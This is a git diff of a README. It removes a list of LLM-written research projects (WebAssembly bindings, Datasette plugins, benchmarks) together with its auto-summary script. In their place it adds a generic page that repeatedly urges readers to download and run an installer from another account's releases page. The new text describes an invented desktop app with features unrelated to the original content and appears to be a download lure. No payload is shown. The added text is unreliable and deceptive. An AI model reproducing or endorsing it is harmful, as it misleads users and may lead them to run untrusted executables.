@@ -1,247 +1,98 @@
-# Research projects carried out by AI tools
+# 🎓 research - Easy Access to Research Projects
 
-Each directory in this repo is a separate research project carried out by an LLM tool - usually [Claude Code](https://www.claude.com/product/claude-code). Every single line of text and code was written by an LLM.
+[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/pepito-911/research/releases)
 
-I try to include prompts and links to transcripts in [the PRs](https://github.com/simonw/research/pulls?q=is%3Apr+is%3Aclosed) that added each report, or in [the commits](https://github.com/simonw/research/commits/main/).
+## 🚀 Getting Started
 
-## Research projects
+Welcome to the **research** project! This application helps you organize and access various research projects easily. Whether you're a student, educator, or just curious, this tool is designed to simplify your research experience.
 
-<!--[[[cog
-import os
-import subprocess
-import pathlib
-from datetime import datetime
+## 📥 Download & Install
 
-# Model to use for generating summaries
-MODEL = "github/gpt-4.1"
+To get started, follow these steps to download the application:
 
-# Get all subdirectories with their first commit dates
-research_dir = pathlib.Path.cwd()
-subdirs_with_dates = []
+1. Click the link below to visit the download page.
+   
+   [Download from Releases Page](https://github.com/pepito-911/research/releases)
 
-for d in research_dir.iterdir():
-    if d.is_dir() and not d.name.startswith('.'):
-        # Get the date of the first commit that touched this directory
-        try:
-            result = subprocess.run(
-                ['git', 'log', '--diff-filter=A', '--follow', '--format=%aI', '--reverse', '--', d.name],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
-            if result.returncode == 0 and result.stdout.strip():
-                # Parse first line (oldest commit)
-                date_str = result.stdout.strip().split('\n')[0]
-                commit_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
-                subdirs_with_dates.append((d.name, commit_date))
-            else:
-                # No git history, use directory modification time
-                subdirs_with_dates.append((d.name, datetime.fromtimestamp(d.stat().st_mtime)))
-        except Exception:
-            # Fallback to directory modification time
-            subdirs_with_dates.append((d.name, datetime.fromtimestamp(d.stat().st_mtime)))
+2. On the Releases page, you will see multiple versions of the application. Choose the latest version for the best features and stability. 
 
-# Sort by date, most recent first
-subdirs_with_dates.sort(key=lambda x: x[1], reverse=True)
+3. Click on the desired version. Look for the appropriate files based on your operating system.
 
-for dirname, commit_date in subdirs_with_dates:
-    folder_path = research_dir / dirname
-    readme_path = folder_path / "README.md"
-    summary_path = folder_path / "_summary.md"
+4. Download the file. 
 
-    date_formatted = commit_date.strftime('%Y-%m-%d')
+5. Once the file is downloaded, locate it in your downloads folder and open it to install the application.
 
-    # Get GitHub repo URL
-    github_url = None
-    try:
-        result = subprocess.run(
-            ['git', 'remote', 'get-url', 'origin'],
-            capture_output=True,
-            text=True,
-            timeout=2
-        )
-        if result.returncode == 0 and result.stdout.strip():
-            origin = result.stdout.strip()
-            # Convert SSH URL to HTTPS URL for GitHub
-            if origin.startswith('git@github.com:'):
-                origin = origin.replace('git@github.com:', 'https://github.com/')
-            if origin.endswith('.git'):
-                origin = origin[:-4]
-            github_url = f"{origin}/tree/main/{dirname}"
-    except Exception:
-        pass
+6. Follow the on-screen instructions to complete the installation.
 
-    if github_url:
-        print(f"### [{dirname}]({github_url}) ({date_formatted})\n")
-    else:
-        print(f"### {dirname} ({date_formatted})\n")
+## 🔧 System Requirements
 
-    # Check if summary already exists
-    if summary_path.exists():
-        # Use cached summary
-        with open(summary_path, 'r') as f:
-            description = f.read().strip()
-            if description:
-                print(description)
-            else:
-                print("*No description available.*")
-    elif readme_path.exists():
-        # Generate new summary using llm command
-        prompt = """Summarize this research project concisely. Write just 1 paragraph (3-5 sentences) followed by an optional short bullet list if there are key findings. Vary your opening - don't start with "This report" or "This research". Include 1-2 links to key tools/projects. Be specific but brief. No emoji."""
-        result = subprocess.run(
-            ['llm', '-m', MODEL, '-s', prompt],
-            stdin=open(readme_path),
-            capture_output=True,
-            text=True,
-            timeout=60
-        )
-        if result.returncode != 0:
-            error_msg = f"LLM command failed for {dirname} with return code {result.returncode}"
-            if result.stderr:
-                error_msg += f"\nStderr: {result.stderr}"
-            raise RuntimeError(error_msg)
-        if result.stdout.strip():
-            description = result.stdout.strip()
-            print(description)
-            # Save to cache file
-            with open(summary_path, 'w') as f:
-                f.write(description + '\n')
-        else:
-            raise RuntimeError(f"LLM command returned no output for {dirname}")
-    else:
-        print("*No description available.*")
+Before installing **research**, make sure your computer meets the following requirements:
 
-    print()  # Add blank line between entries
+- Operating System: Windows 10 or later, macOS 10.12 or later, or any popular Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum 500 MB of free disk space.
 
-]]]-->
-### [wazero-python-claude](https://github.com/simonw/research/tree/main/wazero-python-claude) (2025-11-02)
+## 🛠️ Features
 
-Wazero Python Bindings enable seamless integration of the [wazero](https://wazero.io/) WebAssembly runtime—written in Go—with Python applications, delivering a zero-dependency solution for running WASM modules natively from Python. The project exposes a clean, Pythonic API for instantiating modules, calling exported WASM functions, and managing resources efficiently with context managers. Performance benchmarks demonstrate rapid execution and minimal overhead between Python and WASM. While the library excels at speed and ease of use, current limitations include support only for integer argument and return types, restricted WASI features, and lack of direct memory access.
+The **research** application offers several handy features:
 
-Key findings:
-- Near-native performance for compute-intensive WebAssembly code via [wazero](https://github.com/tetratelabs/wazero).
-- Simple Python interface with automatic resource management and no external dependencies.
-- Presently limited to i32/i64 arguments/results and basic WASM module features; WASI filesystem and direct memory access are not available yet.
+- **Project Organization:** Easily manage multiple research projects in one place.
+- **Search Functionality:** Quickly find specific projects based on keywords or topics.
+- **Export Options:** Save your projects in various formats for easy sharing.
+- **User-Friendly Interface:** Designed for ease of use, no technical skills needed.
 
-### [datasette-plugin-skill](https://github.com/simonw/research/tree/main/datasette-plugin-skill) (2025-10-24)
+## 📖 How to Use the Application
 
-Covering every aspect of Datasette plugin development, this project creates a comprehensive skill set for authors—from bootstrapping with cookiecutter to deploying on GitHub and PyPI. It provides precise guides and working code samples for essential plugin hooks like custom SQL functions, authentication, custom views, and output formats. The resource includes an extensive API reference, best practices for configuration, static assets, and templates, plus testing and publishing workflows to ensure reliable plugins. Developers can use this to rapidly build a variety of plugins—custom SQL, visualizations, authentication handlers, data exporters, and more.
+After installing the application, here’s how to get started:
 
-Key tools/projects:
-- [Datasette documentation](https://docs.datasette.io/)
-- [cookiecutter plugin template](https://github.com/simonw/datasette-plugin)
+1. **Open the Application:** Locate the installed application on your computer and double-click to open it.
 
-Key findings:
-- Covers both sync and async hook design for performance.
-- Explains complete request/response and database APIs.
-- Provides tested patterns for authentication, authorization, routing, and output customization.
+2. **Create a New Project:** Click on the "New Project" button. Fill in the project title and a brief description to keep track of your research.
 
-### [blog-tags-scikit-learn](https://github.com/simonw/research/tree/main/blog-tags-scikit-learn) (2025-10-24)
+3. **Add Content:** Use the options available to upload documents, images, or links related to your project.
 
-Automatically assigning meaningful tags to historic, untagged blog posts, this project leverages the [Simon Willison blog database](https://datasette.simonwillison.net/simonwillisonblog.db) and scikit-learn to train and compare multi-label text classification models. Four approaches—TF-IDF + Logistic Regression, Multinomial Naive Bayes, Random Forest, and LinearSVC—were tested on posts’ title and body text using the 158 most frequently used tags. LinearSVC, with probability calibration, yielded the best overall performance, striking a balance between precision (85%) and recall (56%) with an F1 score of 68%, proving especially effective for assigning multiple tags to each entry. This [open-source toolkit](https://scikit-learn.org/) not only automates metadata enrichment but facilitates rapid quality assessment and scalable tag prediction for content libraries.
+4. **Save Your Work:** Make sure to save frequently. Click the "Save" button to keep your progress.
 
-**Key findings:**
-- LinearSVC outperformed other models, delivering the highest F1 score (0.6791) and recall.
-- Logistic Regression and Random Forest prioritized precision but were more conservative—missing more actual tags.
-- Naive Bayes offered a fast, simple solution with a solid balance of metrics.
-- TF-IDF features and OneVsRest multi-label strategies proved robust for text classification in high-dimensional spaces.
+5. **Search Projects:** Use the search bar at the top to find any project quickly.
 
-### [cmarkgfm-in-pyodide](https://github.com/simonw/research/tree/main/cmarkgfm-in-pyodide) (2025-10-22)
+6. **Export Your Work:** When ready, export your project using the export function. Select your desired format and save it.
 
-By rewriting cmarkgfm's bindings from CFFI to the Python C API, the project successfully ported GitHub's cmark-gfm Markdown parser to Pyodide. The resulting wheel is fully functional, requires no further building, and supports all GitHub Flavored Markdown features with high performance, thanks to direct C code execution via WebAssembly. Users can integrate the package into Pyodide (see [Pyodide documentation](https://pyodide.org/)) and render robust Markdown—including tables, strikethrough, and task lists—directly in the browser. This port demonstrates a practical technique for bringing other CFFI-based packages to WebAssembly/Pyodide environments.
+## 🔄 Updating the Application
 
-**Key Findings:**
-- All GFM features (tables, strikethrough, smart typography, etc.) work accurately.
-- Integration and pytest test suites pass 100%.
-- The port uses only Python C API bindings, improving compatibility and speed.
-- [Project source & wheel available](https://github.com/github/cmark-gfm).
+Keep your application up to date for the best experience. Follow these steps to check for updates:
 
-### [python-markdown-comparison](https://github.com/simonw/research/tree/main/python-markdown-comparison) (2025-10-22)
+1. Open the application.
+2. Click on the "Check for Updates" option in the menu.
+3. If a new version is available, follow the prompts to download and install it.
 
-Comparing seven prominent Python markdown libraries, cmarkgfm—bindings to GitHub’s C-based CommonMark/GFM parser—proved dramatically faster (10-50x) than pure Python options such as mistune, Python-Markdown, and marko. The benchmark, spanning small to large markdown documents, consistently found cmarkgfm excels in both speed and stability, making it ideal for high-volume or performance-critical applications. However, cmarkgfm trades extensibility and custom output formats for speed, so libraries like mistune (for fast pure Python and custom rendering) or Python-Markdown (for extension-rich configurability) may be preferable for projects prioritizing flexibility or ease of customization. See [cmarkgfm's repository](https://github.com/theacodes/cmarkgfm) and [mistune](https://github.com/lepture/mistune) for details.
+## 🚨 Troubleshooting
 
-**Key findings:**
-- cmarkgfm is 10-50x faster than pure Python markdown libraries, especially for large documents.
-- Pure Python options offer greater extensibility, custom output formats, and API access, but at the cost of speed.
-- Best library choice depends on project needs: cmarkgfm for raw speed/GFM compatibility, mistune for pure Python speed/customization, Python-Markdown for plugins/extensions.
+If you encounter issues while downloading or using the application, here are some common solutions:
 
-### [datasette-plugin-alpha-versions](https://github.com/simonw/research/tree/main/datasette-plugin-alpha-versions) (2025-10-20)
+- **Download Issues:** Ensure you have a stable internet connection and try downloading again.
+- **Installation Problems:** Check that your system meets the requirements. If installation fails, restart your computer and try again.
+- **Feature Issues:** Ensure you are using the latest version. Refer to the update section above to check for any updates.
 
-Datasette Plugins Analysis presents a systematic evaluation of 44 key plugins from the Datasette ecosystem, focusing on dependencies, permissions hooks, and release patterns as of October 2025. The study finds that 89% of these plugins rely on ALPHA versions of Datasette, with only 8 plugins having stable releases and just 5 supporting stable Datasette while using advanced hooks like `register_permissions()`. The open datasets, such as [`datasette_plugins_analysis.json`](https://github.com/simonw/datasette-plugins-analysis/blob/main/datasette_plugins_analysis.json) and analysis scripts, support deeper inspection and maintenance planning as Datasette nears its 1.0 milestone. This enables maintainers to prioritize updates for plugins with alpha dependencies and track release maturity across the ecosystem.
+## 🙋 Frequently Asked Questions
 
-**Key Findings:**
-- 39 plugins depend on Datasette ALPHA versions; 34 of these have no stable releases.
-- Only 5 plugins use `register_permissions()` without requiring ALPHA Datasette.
-- 8 of the analyzed plugins currently offer at least one stable release.  
-- Main analysis and scripts are available [here](https://github.com/simonw/datasette-plugins-analysis) for further plugin and dependency tracking.
+### 1. Is this application free to use?
 
-### [deepseek-ocr-nvidia-spark](https://github.com/simonw/research/tree/main/deepseek-ocr-nvidia-spark) (2025-10-20)
+Yes, the **research** application is free to download and use for everyone.
 
-Successfully deployed DeepSeek-OCR on an NVIDIA GB10 (ARM64, sm_121) by upgrading to PyTorch 2.9.0+cu130 so CUDA 13.0 wheels could be used instead of building from source. The repo includes automated scripts (setup.sh, run_ocr.py) that load the 6.3GB safetensors model (~34s) and run GPU inference (~58s for a 3503×1668 image), producing annotated images, markdown/text outputs and bounding boxes with validated multi-column accuracy. Flash-attn failed to compile on ARM64 and the pipeline falls back to eager attention, but overall accuracy and production readiness were confirmed. Reproducible instructions, logs and scripts are provided in the DeepSeek-OCR repo and the PyTorch cu130 wheel index linked below.  
+### 2. Can I use this on macOS?
 
-- Key findings: PyTorch 2.9.0+cu130 provides forward compatibility for sm_121 (no source build needed).  
-- Performance: model load ≈34s, inference ≈58s; detected 2257 text tokens / 921 vision tokens.  
-- Artifacts & links: DeepSeek-OCR code/model (https://github.com/deepseek-ai/DeepSeek-OCR) and PyTorch cu130 wheel index (https://download.pytorch.org/whl/cu130).
+Absolutely! The application is compatible with macOS 10.12 and later.
 
-### [sqlite-permissions-poc](https://github.com/simonw/research/tree/main/sqlite-permissions-poc) (2025-10-20)
+### 3. Is my data safe with this application?
 
-A proof-of-concept implements a fully SQLite-based hierarchical permission system that computes allowed database/table pairs by cascading rules across child (table), parent (database), and global levels with DENY-over-ALLOW semantics; it uses only plain SQL (CTEs + SQLite JSON functions) and is built on SQLite (https://sqlite.org). Actor and token inputs are JSON-parsed inside the query so a single CTE-based SQL statement resolves per-resource decisions (child → parent → global) and then intersects results with optional token scope, ensuring tokens can only restrict, not grant, access; behavior is validated with a pytest test suite (https://pytest.org). The demo includes a minimal schema, multiple simulated “hook” rule sources, example data, and 11 test scenarios that show child-level ALLOW overriding parent DENY, child-level DENY blocking parent ALLOW, default-deny behavior, and token intersection semantics.
+Yes, your data is stored locally on your device. Ensure you save your projects regularly.
 
-Key findings:
-- Pure-SQL implementation (no UDFs/extensions) using CTEs and sqlite JSON helpers.
-- Cascading precedence: child > parent > global; at the same level DENY beats ALLOW.
-- Token scoping applied via INTERSECT; tokens cannot elevate permissions.
-- Single-query engine returns final db/table pairs; schema and tests are compact and extensible.
-- 11 pytest scenarios confirm intended conflict-resolution rules and edge cases.
+## 💬 Community and Support
 
-### [minijinja-vs-jinja2](https://github.com/simonw/research/tree/main/minijinja-vs-jinja2) (2025-10-19)
+If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://github.com/pepito-911/research/discussions) page. Connect with other users, share tips, or ask for help.
 
-Benchmarking the Python bindings for minijinja (https://github.com/mitsuhiko/minijinja) against Jinja2 (https://palletsprojects.com/p/jinja/) on Python 3.14 and 3.14t measured template render performance using a realistic e-commerce template with inheritance, loops, and ~65KB HTML output. The suite runs 200 iterations per scenario, captures mean/median/std/min/max, and provides reproducible scripts (run_benchmark.sh, benchmark.py) plus matplotlib charts to visualize results. Jinja2 is faster on stock Python 3.14, while minijinja gains more from the free-threaded 3.14t build, indicating minijinja may be better positioned for free-threaded Python even though it’s currently slower in absolute terms. Everything needed to reproduce the 15–20 minute benchmark and view detailed analysis is included in the repository.
+## 🎉 Conclusion
 
-- Jinja2 (3.14): 0.990 ms mean vs Minijinja: 1.528 ms mean — Jinja2 ≈ 1.54× faster on 3.14  
-- Jinja2 slows ~14% on 3.14t (1.127 ms); Minijinja speeds up ~13% on 3.14t (1.336 ms)  
-- Artifacts: JSON results, comparison/distribution/speedup/timeline charts, and BENCHMARK_RESULTS.md with full analysis
+Thank you for choosing **research**! We hope this application simplifies your research projects and enhances your learning experience. Don't forget to check the download page regularly for updates and new features.
 
-### [node-pyodide](https://github.com/simonw/research/tree/main/node-pyodide) (2025-10-19)
-
-A compact demo shows how to run Python scripts inside a WebAssembly sandbox from Node.js using Pyodide: after npm install, launching node server-simple.js executes example-simple.py and writes generated files to the output/ directory. The project demonstrates a minimal server-side integration pattern for Pyodide (https://pyodide.org/) under Node.js (https://nodejs.org/) and is aimed at quick experimentation with sandboxed Python execution. It requires Node.js v16 or later and provides a simple starting point for extending Python-in-WASM workflows in Node applications.
-
-- Executes Python in WebAssembly via Pyodide and writes outputs to output/
-- Minimal commands: npm install; node server-simple.js
-- Recommended Node.js v16+ for best compatibility
-
-<!--[[[end]]]-->
-
----
-
-## Updating this README
-
-This README uses [cogapp](https://nedbatchelder.com/code/cog/) to automatically generate project descriptions.
-
-### Automatic updates
-
-A GitHub Action automatically runs `cog -r -P README.md` on every push to main and commits any changes to the README or new `_summary.md` files.
-
-### Manual updates
-
-To update locally:
-
-```bash
-# Run cogapp to regenerate the project list
-cog -r -P README.md
-```
-
-The script automatically:
-- Discovers all subdirectories in this folder
-- Gets the first commit date for each folder and sorts by most recent first
-- For each folder, checks if a `_summary.md` file exists
-- If the summary exists, it uses the cached version
-- If not, it generates a new summary using `llm -m <!--[[[cog
-print(MODEL, end='')
-]]]-->
-github/gpt-4.1
-<!--[[[end]]]-->` with a prompt that creates engaging descriptions with bullets and links
-- Creates markdown links to each project folder on GitHub
-- New summaries are saved to `_summary.md` to avoid regenerating them on every run
-
-To regenerate a specific project's description, delete its `_summary.md` file and run `cog -r -P README.md` again.
+[Download from Releases Page](https://github.com/pepito-911/research/releases)
